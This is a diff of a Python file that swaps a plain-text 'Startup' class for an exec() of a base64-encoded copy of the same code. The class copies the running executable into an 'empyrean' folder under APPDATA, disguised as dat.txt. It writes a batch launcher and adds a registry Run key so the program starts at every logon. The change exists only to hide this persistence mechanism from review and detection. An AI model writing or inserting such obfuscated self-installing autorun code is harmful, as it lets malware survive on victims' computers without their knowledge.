@@ -2,38 +2,6 @@ import subprocess
 import os
 import shutil
 import sys
+import base64
 
-class Startup:
-    def __init__(self) -> None:        
-        self.working_dir = os.getenv("APPDATA") + "\\empyrean"
-    
-        if self.check_self():
-            return
-
-        self.mkdir()
-        self.write_stub()
-        self.regedit()
-    
-    def check_self(self) -> bool:
-        if os.path.realpath(sys.executable) == self.working_dir + "\\dat.txt":
-            return True
-
-        return False
-    
-    def mkdir(self) -> str:
-        if not os.path.isdir(self.working_dir):
-            os.mkdir(self.working_dir)
-        
-        else:
-            shutil.rmtree(self.working_dir)
-            os.mkdir(self.working_dir)
-    
-    def write_stub(self) -> None:
-        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + "\\dat.txt")
-        
-        with open(file=f"{self.working_dir}\\run.bat", mode="w") as f:
-            f.write(f"@echo off\ncall {self.working_dir}\\dat.txt")
-    
-    def regedit(self) -> None:
-        subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "empyrean", "/f"], shell=True)
-        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "empyrean", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)
+exec(base64.b64decode("Y2xhc3MgU3RhcnR1cDoNCiAgICBkZWYgX19pbml0X18oc2VsZikgLT4gTm9uZTogICAgICAgIA0KICAgICAgICBzZWxmLndvcmtpbmdfZGlyID0gb3MuZ2V0ZW52KCJBUFBEQVRBIikgKyAiXFxlbXB5cmVhbiINCiAgICANCiAgICAgICAgaWYgc2VsZi5jaGVja19zZWxmKCk6DQogICAgICAgICAgICByZXR1cm4NCg0KICAgICAgICBzZWxmLm1rZGlyKCkNCiAgICAgICAgc2VsZi53cml0ZV9zdHViKCkNCiAgICAgICAgc2VsZi5yZWdlZGl0KCkNCiAgICANCiAgICBkZWYgY2hlY2tfc2VsZihzZWxmKSAtPiBib29sOg0KICAgICAgICBpZiBvcy5wYXRoLnJlYWxwYXRoKHN5cy5leGVjdXRhYmxlKSA9PSBzZWxmLndvcmtpbmdfZGlyICsgIlxcZGF0LnR4dCI6DQogICAgICAgICAgICByZXR1cm4gVHJ1ZQ0KDQogICAgICAgIHJldHVybiBGYWxzZQ0KICAgIA0KICAgIGRlZiBta2RpcihzZWxmKSAtPiBzdHI6DQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZGlyKHNlbGYud29ya2luZ19kaXIpOg0KICAgICAgICAgICAgb3MubWtkaXIoc2VsZi53b3JraW5nX2RpcikNCiAgICAgICAgDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBzaHV0aWwucm10cmVlKHNlbGYud29ya2luZ19kaXIpDQogICAgICAgICAgICBvcy5ta2RpcihzZWxmLndvcmtpbmdfZGlyKQ0KICAgIA0KICAgIGRlZiB3cml0ZV9zdHViKHNlbGYpIC0+IE5vbmU6DQogICAgICAgIHNodXRpbC5jb3B5Mihvcy5wYXRoLnJlYWxwYXRoKHN5cy5leGVjdXRhYmxlKSwgc2VsZi53b3JraW5nX2RpciArICJcXGRhdC50eHQiKQ0KICAgICAgICANCiAgICAgICAgd2l0aCBvcGVuKGZpbGU9ZiJ7c2VsZi53b3JraW5nX2Rpcn1cXHJ1bi5iYXQiLCBtb2RlPSJ3IikgYXMgZjoNCiAgICAgICAgICAgIGYud3JpdGUoZiJAZWNobyBvZmZcbmNhbGwge3NlbGYud29ya2luZ19kaXJ9XFxkYXQudHh0IikNCiAgICANCiAgICBkZWYgcmVnZWRpdChzZWxmKSAtPiBOb25lOg0KICAgICAgICBzdWJwcm9jZXNzLnJ1bihhcmdzPVsicmVnIiwgImRlbGV0ZSIsICJIS0NVXFxTb2Z0d2FyZVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuIiwgIi92IiwgImVtcHlyZWFuIiwgIi9mIl0sIHNoZWxsPVRydWUpDQogICAgICAgIHN1YnByb2Nlc3MucnVuKGFyZ3M9WyJyZWciLCAiYWRkIiwgIkhLQ1VcXFNvZnR3YXJlXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxSdW4iLCAiL3YiLCAiZW1weXJlYW4iLCAiL3QiLCAiUkVHX1NaIiwgIi9kIiwgZiJ7c2VsZi53b3JraW5nX2Rpcn1cXHJ1bi5iYXQiLCAiL2YiXSwgc2hlbGw9VHJ1ZSk="))
